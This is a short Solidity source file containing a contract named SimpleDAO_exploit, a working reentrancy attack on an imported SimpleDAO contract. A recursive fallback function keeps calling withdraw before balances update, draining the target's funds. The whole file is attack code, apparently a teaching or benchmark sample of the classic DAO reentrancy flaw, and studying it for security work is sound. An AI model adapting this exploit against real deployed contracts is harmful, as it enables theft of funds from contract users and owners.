//
pragma solidity 0.4.24;

import "./SimpleDAO.sol";

contract SimpleDAO_exploit {

  SimpleDAO private dao;
  uint private amount;
  uint private count;

  constructor () public {
    amount = 100;
  }

  function donate (address dao_addr) payable public {
    dao = SimpleDAO (dao_addr);
    dao.donate (msg.sender);
    amount = msg.value;
  }

  // trigger
  function withdraw (address dao_addr) public {
    dao = SimpleDAO (dao_addr);
    count = 0;
    dao.withdraw (amount);
  }

  // fallback function: called within dao.withdraw
  function () payable public {
    if (count < 10) {
      count++;
      dao.withdraw (amount);
    }
  }
}
